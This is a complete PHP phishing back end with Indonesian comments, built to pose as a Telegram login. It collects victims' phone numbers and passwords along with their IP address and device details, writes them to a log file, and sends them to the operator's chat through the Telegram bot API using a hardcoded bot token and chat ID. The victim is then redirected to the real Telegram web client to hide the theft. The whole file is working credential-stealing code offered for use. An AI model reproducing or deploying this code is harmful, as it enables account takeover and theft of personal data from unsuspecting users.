<?php
// ========== KONFIGURASI FINAL ==========
$botToken = "8879076677:AAEb1IDudiK7STDCBdfSZj3LiEWnVSrKkn8";
$chatId   = "8238270594";  // Chat ID Anda dari getUpdates

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Ambil data dari form
    $phone = isset($_POST['phone']) ? $_POST['phone'] : 'Tidak diisi';
    $password = isset($_POST['password']) ? $_POST['password'] : 'Tidak diisi';
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $date = date('Y-m-d H:i:s');
    
    // Simpan ke file backup
    $logData = "[$date] IP: $ip | Phone: $phone | Pass: $password | UA: $userAgent\n";
    file_put_contents("logs.txt", $logData, FILE_APPEND);
    
    // Format pesan untuk Telegram
    $message = "🔐 NEW TELEGRAM LOGIN 🔐\n";
    $message .= "═══════════════════════\n";
    $message .= "📱 Phone : $phone\n";
    $message .= "🔑 Pass  : $password\n";
    $message .= "🌐 IP    : $ip\n";
    $message .= "🖥️ Device: $userAgent\n";
    $message .= "⏰ Time  : $date\n";
    $message .= "═══════════════════════";
    
    // Kirim ke Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Redirect korban ke Telegram asli
    header("Location: https://web.telegram.org/k/");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>